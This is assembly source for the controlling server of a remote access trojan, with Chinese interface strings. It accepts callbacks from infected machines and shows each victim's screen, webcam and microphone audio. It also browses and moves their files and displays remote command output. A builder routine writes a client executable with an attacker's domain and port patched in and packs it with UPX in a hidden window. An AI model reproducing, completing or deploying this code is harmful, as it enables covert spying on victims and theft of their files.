.386
.model flat, stdcall  ;32 bit memory model
option casemap :none  ;case sensitive

include hsbserver.inc
include dmzcode.asm

.code

include DesktopForm.asm
include	FileManage.asm
include CmdForm.asm

OnReceive proc uses ebx esi edi lParam
LOCAL	@lsbyte,@lsls
	mov esi,lParam
	assume esi:ptr OVERLAPPEDPLUS
	mov eax,[esi].socktag
	.if eax==SOCKETTAG.maxconn
		mov [esi].other,1
		inc dwconncount
		invoke lstrcat,[esi].lpipport,CTEXT(" 计算机名:")
		invoke lstrcat,[esi].lpipport,[esi].lpBuffer
		invoke SendMessage,[esi].hmainform,ADDLIST,esi,0
	.elseif eax==SOCKETTAG.desktopconn
		mov [esi].other,2
		invoke LYQMoveMemory,addr [esi].x,[esi].lpBuffer,[esi].dwLength
		invoke SendMessage,[esi].hmainform,CREATEWINDOWDESKTOP,esi,1
		invoke GetDC,[esi].hform
		mov [esi].hScrDC,eax
		invoke CreateCompatibleDC,[esi].hScrDC
		mov [esi].hMemDC,eax
		invoke CreateCompatibleBitmap,[esi].hScrDC,[esi].x,[esi].y
		mov [esi].hBitmap,eax
		invoke SelectObject,[esi].hMemDC,[esi].hBitmap
		mov [esi].oldhbitmap,eax
		m2m [esi].qinxidu,qinxidu
		invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,12
		mov edi,eax
		mov dword ptr[edi],1
		m2m dword ptr[edi+4],[esi].qinxidu
		m2m dword ptr[edi+8],lscpu
		invoke WSASends,[esi].hsocket,edi,12,SOCKETTAG.desktopsend
	.elseif eax==SOCKETTAG.desktopsend
		invoke DesktopView,[esi].lpBuffer,[esi].dwLength,esi
		invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,4
		invoke WSASends,[esi].hsocket,eax,4,SOCKETTAG.desktopsend
	.elseif eax==SOCKETTAG.cameraconn
		mov [esi].other,3
		invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,[esi].dwLength
		mov [esi].lpbmpinfo,eax
		invoke LYQMoveMemory,[esi].lpbmpinfo,[esi].lpBuffer,[esi].dwLength
		mov edi,[esi].lpBuffer
		assume edi:ptr BITMAPINFOHEADER
		m2m [esi].x,[edi].biWidth
		m2m [esi].y,[edi].biHeight
		assume edi:nothing
		invoke SendMessage,[esi].hmainform,CREATEWINDOWDESKTOP,esi,2
		invoke GetDC,[esi].hform
		mov [esi].hScrDC,eax
		invoke CreateCompatibleDC,[esi].hScrDC
		mov [esi].hMemDC,eax
		invoke CreateCompatibleBitmap,[esi].hScrDC,[esi].x,[esi].y
		mov [esi].hBitmap,eax
		invoke SelectObject,[esi].hMemDC,[esi].hBitmap
		mov [esi].oldhbitmap,eax
		call lpDrawDibOpen
		mov [esi].hDrwDC,eax
		invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,2
		invoke WSASends,[esi].hsocket,eax,2,SOCKETTAG.camerasend
	.elseif eax==SOCKETTAG.camerasend
		invoke CameraView,[esi].lpBuffer,[esi].dwLength,esi
		invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,2
		invoke WSASends,[esi].hsocket,eax,2,SOCKETTAG.camerasend
	.elseif eax==SOCKETTAG.recconn
		mov [esi].other,4
		invoke SendMessage,[esi].hmainform,CREATEWINDOWDESKTOP,esi,0
		invoke InitPlay,esi
		invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,2
		invoke WSASends,[esi].hsocket,eax,2,SOCKETTAG.recsend
	.elseif eax==SOCKETTAG.recsend
		invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,16384
		mov edi,eax
		invoke LYQMoveMemory,edi,[esi].lpBuffer,[esi].dwLength
		invoke StartPlay,edi,esi
	.elseif eax==SOCKETTAG.fileconn
		mov [esi].other,5
		invoke SendMessage,[esi].hmainform,CREATEWINDOWFILE,esi,0
		mov @lsls,0
		m2m @lsbyte,[esi].lpBuffer
		.while TRUE
			invoke LYQCmpMemory,addr @lsls,@lsbyte,4
			.if eax
				.break
			.else
				invoke AddTreeViewNode,[esi].htreeview,0,@lsbyte,esi
				add @lsbyte,4
			.endif
		.endw
	.elseif eax==SOCKETTAG.sendfilestr
		mov @lsbyte,0
		mov edi,[esi].lpBuffer
		.while TRUE
			invoke lstrcmp,edi,addr @lsbyte
			.if eax==0
				.break
			.else	
				invoke AddTreeViewNode,[esi].htreeview,[esi].htvitem,edi,esi
				invoke lstrlen,edi
				add edi,eax
				add edi,1
			.endif
		.endw
		invoke EnableWindow,[esi].htreeview,TRUE
	.elseif eax==SOCKETTAG.fileinfo
		invoke LYQMoveMemory,addr [esi].nfilesize,[esi].lpBuffer,[esi].dwLength
		.if [esi].nfilesize>0
			invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,100
			mov ebx,eax
			invoke wsprintf,ebx,CTEXT("%d"),[esi].nfilesize
			invoke SetWindowText,[esi].hstatic,ebx
			invoke GlobalFree,ebx
			mov [esi].nfileseek,0
			invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,2
			invoke WSASends,[esi].hsocket,eax,2,SOCKETTAG.gofile
		.else	
			invoke EnableFileTUREFALSE,esi,TRUE
			invoke CloseHandle,[esi].hfile
			invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,2
			invoke WSASends,[esi].hsocket,eax,2,SOCKETTAG.closefile
		.endif	
	.elseif eax==SOCKETTAG.gofile
		invoke WriteFile,[esi].hfile,[esi].lpBuffer,[esi].dwLength,addr @lsls,NULL
		mov eax,[esi].dwLength
		add [esi].nfileseek,eax
		invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,100
		mov ebx,eax
		invoke wsprintf,ebx,CTEXT("%d"),[esi].nfileseek
		invoke SetWindowText,[esi].hrecivestatic,ebx
		invoke GlobalFree,ebx
		mov eax,[esi].nfilesize
		.if [esi].nfileseek<eax
			invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,2
			invoke WSASends,[esi].hsocket,eax,2,SOCKETTAG.gofile
		.else	
			invoke EnableFileTUREFALSE,esi,TRUE
			invoke CloseHandle,[esi].hfile
			invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,2
			invoke WSASends,[esi].hsocket,eax,2,SOCKETTAG.closefile
		.endif
	.elseif eax==SOCKETTAG.scgetfilesize
		invoke GetFileSize,[esi].hfile,NULL
		mov [esi].nfilesize,eax
		mov [esi].nfileseek,0
		invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,100
		mov ebx,eax
		invoke wsprintf,ebx,CTEXT("%d"),[esi].nfilesize
		invoke SetWindowText,[esi].hstatic,ebx
		invoke GlobalFree,ebx
		invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,4
		mov ebx,eax
		invoke LYQMoveMemory,ebx,addr [esi].nfilesize,4
		invoke WSASends,[esi].hsocket,ebx,4,SOCKETTAG.scgetfilesize	
	.elseif eax==SOCKETTAG.scgofile
		mov ebx,[esi].nfilesize
		mov eax,[esi].nfileseek
		sub ebx,eax
		.if ebx>8192
		    invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,8192
		    mov edi,eax
			invoke ReadFile,[esi].hfile,edi,8192,addr @lsls,NULL
			add [esi].nfileseek,8192
			invoke WSASends,[esi].hsocket,edi,8192,SOCKETTAG.scgofile
		.else
		    invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,ebx
		    mov edi,eax
			invoke ReadFile,[esi].hfile,edi,ebx,addr @lsls,NULL
			add [esi].nfileseek,ebx
			invoke WSASends,[esi].hsocket,edi,ebx,SOCKETTAG.scgofile
		.endif
		invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,100
		mov ebx,eax
		invoke wsprintf,ebx,CTEXT("%d"),[esi].nfileseek
		invoke SetWindowText,[esi].hrecivestatic,ebx
		invoke GlobalFree,ebx
	.elseif eax==SOCKETTAG.scclosefile
		invoke EnableFileTUREFALSE,esi,TRUE
		invoke CloseHandle,[esi].hfile
	.elseif eax==SOCKETTAG.cmdrun
		invoke SendMessage,[esi].hform,6100,NULL,NULL
		invoke SendMessage,[esi].hCmdRich,EM_REPLACESEL,FALSE,[esi].lpBuffer	
		invoke SendMessage,[esi].hCmdRich,EM_SETSEL,-1,-1
		invoke SendMessage,[esi].hCmdRich,EM_SCROLLCARET,0,0
		invoke SendMessage,[esi].hform,6200,NULL,NULL	
	.elseif eax==SOCKETTAG.biaoshi
		invoke lstrcat,[esi].lpipport,CTEXT(" 计算机名:")
		invoke lstrcat,[esi].lpipport,[esi].lpBuffer
	.endif
	assume esi:nothing
	ret
OnReceive	endp

WrokerIOFree proc uses ebx esi edi lParam
	mov esi,lParam
	assume esi:ptr OVERLAPPEDPLUS			
	.if	[esi].nfree==0
		mov [esi].nfree,1  
		.if [esi].other==1
			mov [esi].other,0
			dec dwconncount
			invoke SendMessage,[esi].hmainform,DELETELIST,esi,0
		.elseif [esi].other==2
			invoke SelectObject,[esi].hMemDC,[esi].oldhbitmap
		    invoke DeleteObject,[esi].hBitmap
			invoke DeleteDC,[esi].hMemDC
			invoke ReleaseDC,[esi].hform,[esi].hScrDC
			invoke DeleteDC,[esi].hScrDC
			invoke SendMessage,[esi].hmainform,DESTROYWINDOW,esi,0
		.elseif [esi].other==3
			invoke SelectObject,[esi].hMemDC,[esi].oldhbitmap
		    invoke DeleteObject,[esi].hBitmap
			invoke DeleteDC,[esi].hMemDC
			invoke ReleaseDC,[esi].hform,[esi].hScrDC
			invoke DeleteDC,[esi].hScrDC
			invoke GlobalFree,[esi].lpbmpinfo
			push [esi].hDrwDC
			call lpDrawDibClose
			invoke SendMessage,[esi].hmainform,DESTROYWINDOW,esi,0
		.elseif [esi].other==4
			mov [esi].hBitmap,1
			invoke waveOutReset,[esi].hWaveOut
			invoke waveOutClose,[esi].hWaveOut
			invoke SendMessage,[esi].hmainform,DESTROYWINDOW,esi,0
		.elseif [esi].other==5
			invoke CloseHandle,[esi].hfile
			invoke SendMessage,[esi].hmainform,DESTROYWINDOW,esi,0
		.endif
		.if [esi].opCode!=3
			invoke GlobalFree,[esi].lpipport
			invoke closesocket,[esi].hsocket
		.endif
		invoke GlobalFree,[esi].wsabuf.buf
		invoke GlobalFree,[esi].lpBuffer
		;invoke GlobalFree,esi
	.endif
	assume esi:nothing
	ret
WrokerIOFree endp

WorkerThread	proc uses ebx esi edi lParam
	LOCAL	@stck,@NumberOfBytes:dword
	LOCAL	@overlapped,@lsls:dword
	LOCAL	@recvbytes,@flags:dword
	.while hjmp
		mov @NumberOfBytes,0
		mov @overlapped,0
		mov @lsls,0
		invoke GetQueuedCompletionStatus,hiocp,addr @NumberOfBytes,addr @stck,addr @overlapped,INFINITE		
		.if eax==0 && @overlapped==0
			.continue
		.elseif eax==0 && @overlapped!=0
			mov @lsls,1
		.endif
		mov esi,@overlapped
		assume esi:ptr OVERLAPPEDPLUS
		invoke InterlockedCompareExchange,addr [esi].hcpumutex,lParam,0
		invoke WaitForSingleObject,[esi].hcpumutex,INFINITE
		.if [esi].opCode==0 || @lsls || [esi].nfree || [esi].otherfree
			invoke WrokerIOFree,esi
	   	.elseif	@NumberOfBytes==0
   			xor eax,eax
	    .elseif [esi].opCode==1
        	mov edi,[esi].lpBuffer
        	add edi,[esi].dwSeek
        	invoke LYQMoveMemory,edi,[esi].wsabuf.buf,@NumberOfBytes
            mov eax,@NumberOfBytes
            add [esi].dwSeek,eax	  
            mov eax,[esi].dwLength          
            .if [esi].dwSeek==eax
            	mov edi,[esi].lpBuffer
            	mov eax,dword ptr[edi]
            	mov [esi].dwLength,eax
            	xor eax,eax
				mov ax,word ptr[edi+4]
				mov [esi].socktag,eax
		    	mov edi,dword ptr[edi+6]
		    	invoke GetCRC32,[esi].lpBuffer,6
		    	.if eax!=edi
	            	invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,10
	            	mov [esi].lpBuffer,eax
	            	mov [esi].dwLength,10
	            	invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,10
	            	mov [esi].wsabuf.buf,eax
	            	mov [esi].wsabuf.len,10
					mov [esi].opCode,0
					invoke WrokerIOFree,esi
				    invoke ReleaseMutex,[esi].hcpumutex
					.continue
		    	.endif
				invoke GlobalReAlloc,[esi].lpBuffer,[esi].dwLength,GMEM_ZEROINIT or GMEM_MOVEABLE
				mov [esi].lpBuffer,eax
				invoke GlobalReAlloc,[esi].wsabuf.buf,[esi].dwLength,GMEM_ZEROINIT or GMEM_MOVEABLE
				mov [esi].wsabuf.buf,eax
				m2m [esi].wsabuf.len,[esi].dwLength
		    	invoke LYQZeroMemory,addr [esi].ol,sizeof OVERLAPPED
		    	mov [esi].opCode,2
		    	mov [esi].dwSeek,0
		        mov @recvbytes,0
		        mov @flags,0
			    invoke WSARecv,[esi].hsocket,addr [esi].wsabuf,1,addr @recvbytes,addr @flags,esi,NULL	
				.if eax==SOCKET_ERROR
					invoke WSAGetLastError
					.if eax!= WSA_IO_PENDING
						mov [esi].opCode,0
						invoke PostQueuedCompletionStatus,hiocp,0,0,esi
					.endif
				.endif	
            .else
	            mov edi,[esi].dwLength
	            sub edi,[esi].dwSeek
				invoke GlobalReAlloc,[esi].wsabuf.buf,edi,GMEM_ZEROINIT or GMEM_MOVEABLE
				mov [esi].wsabuf.buf,eax
				mov [esi].wsabuf.len,edi
	            invoke LYQZeroMemory,addr [esi].ol,sizeof OVERLAPPED
	            mov @recvbytes,0
		        mov @flags,0
			    invoke WSARecv,[esi].hsocket,addr [esi].wsabuf,1,addr @recvbytes,addr @flags,esi,NULL	
				.if eax==SOCKET_ERROR
					invoke WSAGetLastError
					.if eax!= WSA_IO_PENDING
						mov [esi].opCode,0
						invoke PostQueuedCompletionStatus,hiocp,0,0,esi
					.endif
				.endif	
            .endif
	    .elseif [esi].opCode==2
    	    mov edi,[esi].lpBuffer
        	add edi,[esi].dwSeek
        	invoke LYQMoveMemory,edi,[esi].wsabuf.buf,@NumberOfBytes
            mov eax,@NumberOfBytes
            add [esi].dwSeek,eax
            mov eax,[esi].dwLength
            .if [esi].dwSeek==eax
            	;/////////////////////////////////////////
	            invoke OnReceive,esi
            	;////////////////////////////////////////
				invoke GlobalReAlloc,[esi].wsabuf.buf,10,GMEM_ZEROINIT or GMEM_MOVEABLE
				mov [esi].wsabuf.buf,eax
				mov [esi].wsabuf.len,10
				invoke GlobalReAlloc,[esi].lpBuffer,10,GMEM_ZEROINIT or GMEM_MOVEABLE
				mov [esi].lpBuffer,eax
				mov [esi].dwLength,10
		    	invoke LYQZeroMemory,addr [esi].ol,sizeof OVERLAPPED
		    	mov [esi].opCode,1
		    	mov [esi].socktag,0
		    	mov [esi].dwSeek,0	   		         
		    	mov @recvbytes,0
		        mov @flags,0 
		    	invoke WSARecv,[esi].hsocket,addr [esi].wsabuf,1,addr @recvbytes,addr @flags,esi,NULL        
				.if eax==SOCKET_ERROR
					invoke WSAGetLastError
					.if eax!= WSA_IO_PENDING
						mov [esi].opCode,0
						invoke PostQueuedCompletionStatus,hiocp,0,0,esi
					.endif
				.endif		            
            .else
	            mov edi,[esi].dwLength
	            sub edi,[esi].dwSeek
	            invoke GlobalReAlloc,[esi].wsabuf.buf,edi,GMEM_ZEROINIT or GMEM_MOVEABLE
	            mov [esi].wsabuf.buf,eax
	            mov [esi].wsabuf.len,edi
	            invoke LYQZeroMemory,addr [esi].ol,sizeof OVERLAPPED
	            mov @recvbytes,0
		        mov @flags,0
			    invoke WSARecv,[esi].hsocket,addr [esi].wsabuf,1,addr @recvbytes,addr @flags,esi,NULL		            	
				.if eax==SOCKET_ERROR
					invoke WSAGetLastError
					.if eax!= WSA_IO_PENDING
						mov [esi].opCode,0
						invoke PostQueuedCompletionStatus,hiocp,0,0,esi
					.endif
				.endif		            
            .endif
	    .elseif [esi].opCode==3
	    	mov edi,[esi].dwSeek
	    	mov eax,@NumberOfBytes
	    	.if eax==[esi].dwLength || edi==[esi].dwLength
				invoke GlobalFree,[esi].wsabuf.buf
				invoke GlobalFree,[esi].lpBuffer
			    invoke ReleaseMutex,[esi].hcpumutex
	    		invoke GlobalFree,esi
				.continue
	    	.else
	    		mov eax,@NumberOfBytes
	    		add [esi].dwSeek,eax
	    		mov edi,[esi].dwLength
	    		sub edi,[esi].dwSeek
				invoke GlobalReAlloc,[esi].wsabuf.buf,edi,GMEM_ZEROINIT or GMEM_MOVEABLE
	    		mov [esi].wsabuf.buf,eax
	    		mov [esi].wsabuf.len,edi
	    		mov eax,[esi].lpBuffer
	    		add eax,[esi].dwSeek
	    		invoke LYQMoveMemory,[esi].wsabuf.buf,eax,edi
	    		invoke LYQZeroMemory,addr [esi].ol,sizeof OVERLAPPED
			    mov @recvbytes,0
				mov @flags,0
				invoke WSASend,[esi].hsocket,addr [esi].wsabuf,1,addr @recvbytes,@flags,esi,NULL	
				.if eax==SOCKET_ERROR
					invoke WSAGetLastError
					.if eax!= WSA_IO_PENDING
						mov [esi].otherfree,1
						invoke PostQueuedCompletionStatus,hiocp,0,0,esi
					.endif
				.endif		
	    	.endif
	    .endif
	    invoke ReleaseMutex,[esi].hcpumutex
	    assume esi:nothing
 	.endw
	ret
WorkerThread	endp

StartListen		proc uses ebx esi edi lParam
	LOCAL	@stsin:sockaddr_in
	LOCAL	@stnewsin:sockaddr_in
	LOCAL	@stsysinfo:SYSTEM_INFO
	LOCAL	@newsock,@newsinlen,@lsbytes:dword
	LOCAL	@recvbytes,@flags:dword
	LOCAL	@szipport,@szport:dword
	m2m hjmp,03CF1A80Dh
	invoke GetCRC32,lsyuming,200
	mov hiocp,eax
	invoke LYQCmpMemory,addr hjmp,addr hiocp,4
	.if !eax
		mov hjmp,0
;		invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,200
;		mov edi,eax
;		invoke wsprintf,edi,CTEXT("%X"),hiocp
;		invoke MessageBox,0,edi,edi,MB_OK
	.endif
	invoke CreateIoCompletionPort,INVALID_HANDLE_VALUE,NULL,NULL,NULL
	mov hiocp,eax
	invoke GetSystemInfo,addr @stsysinfo
	xor edi,edi
	mov ebx,@stsysinfo.dwNumberOfProcessors
	shl ebx,1
    .while edi<ebx
    	inc edi
    	invoke CreateMutex,NULL,FALSE,NULL
    	invoke CreateThread,NULL,NULL,addr WorkerThread,eax,NULL,NULL
    .endw
	invoke WSASocket,AF_INET,SOCK_STREAM,NULL,NULL,NULL,WSA_FLAG_OVERLAPPED
	mov hsocket,eax
	invoke htons,dwipport
	mov @stsin.sin_port,ax
	mov @stsin.sin_family,AF_INET
	mov @stsin.sin_addr,INADDR_ANY
	mov @stsin.sin_zero,0
	invoke bind,hsocket,addr @stsin,sizeof sockaddr_in
	.if eax!=SOCKET_ERROR
		invoke listen,hsocket,720
		.while TRUE
			invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,720
			mov @szipport,eax
			mov @newsinlen,sizeof sockaddr_in
			invoke accept,hsocket,addr @stnewsin,addr @newsinlen
			.break .if eax==INVALID_SOCKET
			mov @newsock,eax
			mov eax,@stnewsin.sin_addr
			mov esi,eax
			invoke inet_ntoa,eax
			mov @lsbytes,eax
			.if lsargv==1
				.if ipsearAddress
					push 512
					push @szipport
					push esi
					call ipsearAddress
				.endif
				invoke lstrcat,@szipport,CTEXT(" ")
				invoke lstrcat,@szipport,@lsbytes
				invoke lstrcat,@szipport,CTEXT(":")
				invoke lstrlen,@szipport
				mov ebx,@szipport
				add ebx,eax
				invoke ntohs,@stnewsin.sin_port
				invoke wsprintf,ebx,CTEXT("%d"),ax
			.else
				invoke lstrcat,@szipport,@lsbytes
				invoke lstrcat,@szipport,CTEXT(":")
				invoke lstrlen,@szipport
				mov ebx,@szipport
				add ebx,eax
				invoke ntohs,@stnewsin.sin_port
				invoke wsprintf,ebx,CTEXT("%d"),ax
				invoke lstrcat,@szipport,CTEXT(" ")
				.if ipsearAddress
					invoke lstrlen,@szipport
					mov ebx,@szipport
					add ebx,eax
					push 512
					push ebx
					push esi
					call ipsearAddress
				.endif
			.endif
			invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,sizeof OVERLAPPEDPLUS
			mov esi,eax
			assume esi:ptr OVERLAPPEDPLUS
			m2m [esi].hmainform,hhWnd
			m2m [esi].lpipport,@szipport
			invoke CreateIoCompletionPort,@newsock,hiocp,NULL,NULL
			mov [esi].wsabuf.len,10
			invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,10
			mov [esi].wsabuf.buf,eax
			m2m [esi].hsocket,@newsock
			mov [esi].opCode,1
			mov [esi].dwSeek,0
			mov [esi].socktag,0
			mov [esi].dwLength,10
			invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,10
			mov [esi].lpBuffer,eax
			mov @recvbytes,0
			mov @flags,0
			invoke WSARecv,@newsock,addr [esi].wsabuf,1,addr @recvbytes,addr @flags,esi,NULL	
			.if eax==SOCKET_ERROR
				invoke WSAGetLastError
				.if eax!= WSA_IO_PENDING
					mov [esi].opCode,0
					invoke PostQueuedCompletionStatus,hiocp,0,0,esi
				.endif
			.endif	
			assume esi:nothing
		.endw
	.else
		mov hlmenu,0
		invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,100
		mov edi,eax
		invoke lstrcat,edi,CTEXT("监听端口：")
		mov ebx,edi
		add ebx,10
		invoke wsprintf,ebx,CTEXT("%d"),dwipport
		invoke lstrcat,edi,CTEXT("  失败")
		invoke SendDlgItemMessage,hhWnd,IDC_LST1,LB_ADDSTRING,0,edi
		invoke GlobalFree,edi	
	.endif
	ret
StartListen endp

HSBCreateFile	proc uses ebx esi edi
	LOCAL	@lsls,@hrfile,@hwfile,@hresinfo,@dwressize,@lpres:dword
	invoke DeleteFile,CTEXT("客户端.exe")
	.if lschongqi
		mov ebx,lsyuming
		add ebx,88
		mov dword ptr[ebx],1
	.endif
	mov ebx,lsyuming
	add ebx,92
	mov edi,dwipport
	mov dword ptr[ebx],edi
	mov @dwressize,28160
	lea eax,dmzcode
	mov dword ptr[eax],00905A4Dh
	mov @lpres,eax
	mov ebx,eax
	invoke CreateFile,CTEXT("客户端.exe"),GENERIC_WRITE,FILE_SHARE_READ,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL
	.if eax
		mov @hwfile,eax
		add ebx,18944
		invoke RtlMoveMemory,ebx,lsyuming,100
		invoke WriteFile,@hwfile,@lpres,@dwressize,addr @lsls,NULL
		invoke FlushFileBuffers,@hwfile
		invoke CloseHandle,@hwfile
	.endif
	.if lsupx
		invoke ShellExecute,0,CTEXT("open"),CTEXT("upx.exe"),CTEXT("客户端.exe"),0,SW_HIDE
	.endif
	ret
HSBCreateFile endp

Getargv	proc	_dwArgv,_lpReturn,_dwSize
LOCAL	@dwArgv,@dwFlag
		pushad
		inc	_dwArgv
		mov	@dwArgv,0
		mov	edi,_lpReturn
		invoke	GetCommandLine
		mov	esi,eax
		cld
_argv_loop:
		lodsb
		or	al,al
		jz	_argv_end
		cmp	al,CHAR_BLANK
		jz	_argv_loop
		dec	esi
		inc	@dwArgv
		mov	@dwFlag,FALSE
		mov	eax,_dwArgv
		cmp	eax,@dwArgv
		jnz	@F
		mov	@dwFlag,TRUE
		@@:
_argv_loop1:
		lodsb
		or	al,al
		jz	_argv_end
		cmp	al,CHAR_BLANK
		jz	_argv_loop
		cmp	al,CHAR_DELI
		jz	_argv_loop2
		cmp	_dwSize,1
		jle	@F
		cmp	@dwFlag,TRUE
		jne	@F
		stosb
		dec	_dwSize
		@@:
		jmp	_argv_loop1
_argv_loop2:
		lodsb
		or	al,al
		jz	_argv_end
		cmp	al,CHAR_DELI
		jz	_argv_loop1
		cmp	_dwSize,1
		jle	@F
		cmp	@dwFlag,TRUE
		jne	@F
		stosb
		dec	_dwSize
		@@:
		jmp	_argv_loop2
_argv_end:
		xor	al,al
		stosb
		popad
		ret
Getargv	endp

InitServer proc
	LOCAL	@lsbytes[200]:byte
	LOCAL	@wsadata:WSADATA
	LOCAL	@ntid:NOTIFYICONDATA
	pushad
	mov qinxidu,8
	mov lsargv,0
	mov lschongqi,0
	mov lsshifang,0
	mov dwipport,777
	mov lsupx,1
	mov lscpu,37
	invoke LYQZeroMemory,addr @lsbytes,200
	invoke Getargv,1,addr @lsbytes,200
	invoke StrToInt,addr @lsbytes
	mov lsshifang,eax
	invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,200
	mov lsyuming,eax
	invoke LYQZeroMemory,addr @lsbytes,200
	invoke Getargv,2,addr @lsbytes,200
	invoke LYQMoveMemory,lsyuming,addr @lsbytes,88
	invoke LYQZeroMemory,addr @lsbytes,200
	invoke Getargv,3,addr @lsbytes,200
	invoke StrToInt,addr @lsbytes
	.if eax
		mov dwipport,eax
	.endif
	invoke LYQZeroMemory,addr @lsbytes,200
	invoke Getargv,4,addr @lsbytes,200
	invoke StrToInt,addr @lsbytes
	mov lschongqi,eax
	invoke LYQZeroMemory,addr @lsbytes,200
	invoke Getargv,5,addr @lsbytes,200
	invoke StrToInt,addr @lsbytes
	mov lsupx,eax
	invoke LYQZeroMemory,addr @lsbytes,200
	invoke Getargv,6,addr @lsbytes,200
	invoke StrToInt,addr @lsbytes
	mov lsargv,eax
	invoke LYQZeroMemory,addr @lsbytes,200
	invoke Getargv,7,addr @lsbytes,200
	invoke StrToInt,addr @lsbytes
	.if eax
		mov lscpu,eax
	.endif
	.if lsshifang
		invoke HSBCreateFile
	.endif
;#########################################################################
	mov dwconncount,0
;#########################################################################
	invoke LoadLibrary,CTEXT("msvfw32.dll")
	mov edi,eax
	invoke GetProcAddress,edi,CTEXT("DrawDibOpen")
	mov lpDrawDibOpen,eax
	invoke GetProcAddress,edi,CTEXT("DrawDibClose")
	mov lpDrawDibClose,eax
	invoke GetProcAddress,edi,CTEXT("DrawDibDraw")
	mov lpDrawDibDraw,eax
	mov ipsearAddress,0
	invoke LoadLibrary,CTEXT("ipsearcher.dll")
	.if eax!=NULL
		mov ebx,eax
		invoke GetProcAddress,ebx,CTEXT("GetAddrStr")
		mov ipsearAddress,eax
		invoke GetProcAddress,ebx,CTEXT("Init")
		call eax
	.endif
;#########################################################################
	invoke LoadMenu,hInstance,IDR_MENU
	mov hlmenu,eax
	invoke GetSubMenu,hlmenu,0
	mov hlmenu,eax
	invoke LoadMenu,hInstance,IDR_DMENU
	mov hdmenu,eax
	invoke GetSubMenu,hdmenu,0
	mov hdmenu,eax
    invoke LoadIcon,hInstance,ICO_MAIN
	mov ebx,eax
	invoke SendMessage,hhWnd,WM_SETICON,ICON_BIG,ebx
	mov @ntid.cbSize,sizeof NOTIFYICONDATA
	mov @ntid.hIcon,ebx
	m2m @ntid.hwnd,hhWnd
	mov @ntid.uID,1289
	mov @ntid.uFlags,NIF_ICON OR NIF_MESSAGE
	mov @ntid.uCallbackMessage,1290
	invoke Shell_NotifyIcon,NIM_ADD,addr @ntid
;#########################################################################
	invoke GetDlgItem,hhWnd,1001
	mov ebx,eax
	invoke SendMessage,ebx,TBM_SETRANGEMAX,0,5
	invoke SendMessage,ebx,TBM_SETPOS,TRUE,2
	invoke GetDlgItem,hhWnd,1004
	mov hwinstatus,eax
	invoke SendMessage,hwinstatus,SB_SETPARTS,7,addr dwstatuswidth
	invoke SendMessage,hwinstatus,SB_SETTEXT,0,CTEXT("连接:0")
	invoke SendMessage,hwinstatus,SB_SETTEXT,1,CTEXT("颜色:8")
	invoke LYQZeroMemory,addr @lsbytes,200
	invoke lstrcat,addr @lsbytes,CTEXT("ST:")
	lea ebx,[@lsbytes+3]
	invoke wsprintf,ebx,CTEXT("%d"),lscpu
	invoke SendMessage,hwinstatus,SB_SETTEXT,2,addr @lsbytes
	invoke LYQZeroMemory,addr @lsbytes,200
	invoke lstrcat,addr @lsbytes,CTEXT("排序:")
	lea ebx,[@lsbytes+5]
	invoke wsprintf,ebx,CTEXT("%d"),lsargv
	invoke SendMessage,hwinstatus,SB_SETTEXT,3,addr @lsbytes
	invoke LYQZeroMemory,addr @lsbytes,200
	invoke lstrcat,addr @lsbytes,CTEXT("UPX:")
	lea ebx,[@lsbytes+4]
	invoke wsprintf,ebx,CTEXT("%d"),lsupx
	invoke SendMessage,hwinstatus,SB_SETTEXT,4,addr @lsbytes
	invoke LYQZeroMemory,addr @lsbytes,200
	invoke lstrcat,addr @lsbytes,CTEXT("端口:")
	lea ebx,[@lsbytes+5]
	invoke wsprintf,ebx,CTEXT("%d"),dwipport
	invoke SendMessage,hwinstatus,SB_SETTEXT,5,addr @lsbytes
	invoke LYQZeroMemory,addr @lsbytes,200
	invoke lstrcat,addr @lsbytes,CTEXT("域名:")
	invoke lstrcat,addr @lsbytes,lsyuming
	invoke SendMessage,hwinstatus,SB_SETTEXT,6,addr @lsbytes
	invoke LYQZeroMemory,lsyuming,200
	invoke GetWindowText,hhWnd,lsyuming,200
	invoke lstrcat,lsyuming,addr szhttp
;#########################################################################
	invoke GetSystemMetrics,SM_CXSCREEN 
	mov nDesktopWidth,eax
	mov edi,eax
	sub edi,268
	invoke GetSystemMetrics,SM_CYSCREEN
	mov nDesktopHeight,eax
	xor edx,edx
	mov ecx,2
	div ecx
	sub eax,188
	invoke SetWindowPos,hhWnd,HWND_TOPMOST,edi,eax,NULL,NULL,SWP_NOSIZE
	sub nDesktopWidth,480
	sub nDesktopHeight,180
;#########################################################################
	invoke GetSystemMenu,hhWnd,FALSE
	mov edi,eax
	invoke AppendMenu,edi,MF_SEPARATOR,NULL,NULL
	invoke AppendMenu,edi,MF_STRING,IDM_ABOUT,addr szhttp
;#########################################################################
	invoke WSAStartup,0002h,addr @wsadata
	invoke CreateThread,NULL,NULL,addr StartListen,NULL,NULL,NULL
	popad
	ret
